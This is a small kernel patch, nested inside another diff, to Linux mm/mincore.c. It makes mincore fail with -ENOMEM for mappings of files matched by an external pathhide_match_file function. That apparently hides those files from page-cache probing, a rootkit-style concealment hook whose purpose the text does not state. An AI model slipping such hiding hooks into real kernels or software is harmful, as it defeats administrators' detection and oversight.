@@ -1,0 +1,16 @@
+--- a/mm/mincore.c
++++ b/mm/mincore.c
+@@ -190,10 +190,13 @@
+ 	struct vm_area_struct *vma;
+ 	unsigned long end;
+ 	int err;
++	extern bool pathhide_match_file(struct file *file);
+ 
+ 	vma = vma_lookup(current->mm, addr);
+ 	if (!vma)
+ 		return -ENOMEM;
++	if (vma->vm_file && pathhide_match_file(vma->vm_file))
++		return -ENOMEM;
+ 	end = min(vma->vm_end, addr + (pages << PAGE_SHIFT));
+ 	if (!can_do_mincore(vma)) {
+ 		unsigned long pages = DIV_ROUND_UP(end - addr, PAGE_SIZE);
